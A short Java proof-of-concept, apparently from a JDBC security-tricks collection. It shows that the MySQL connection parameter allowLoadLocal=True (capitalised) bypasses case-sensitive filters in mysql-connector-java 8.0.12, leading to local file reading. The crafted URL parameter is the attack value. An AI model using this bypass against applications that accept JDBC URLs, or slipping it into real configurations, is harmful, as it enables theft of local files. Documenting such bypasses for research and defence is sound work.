package com.jdbc.tricks.upper_case;

import com.jdbc.tricks.utils.MysqlConnectionUtils;

/**
 * 测试allowLoadLocal参数大小写绕过(True而非true)导致的文件读取漏洞
 * 驱动版本：mysql-connector-java 8.0.12
 */
public class AllowLoadLocal_TrueUpperCaseBypass {

    public static void main(String[] args) {
        String url = "jdbc:mysql://127.0.0.1:3306/test?allowLoadLocal=True";
        MysqlConnectionUtils.connect(url, "root", "root", true);
    }
}
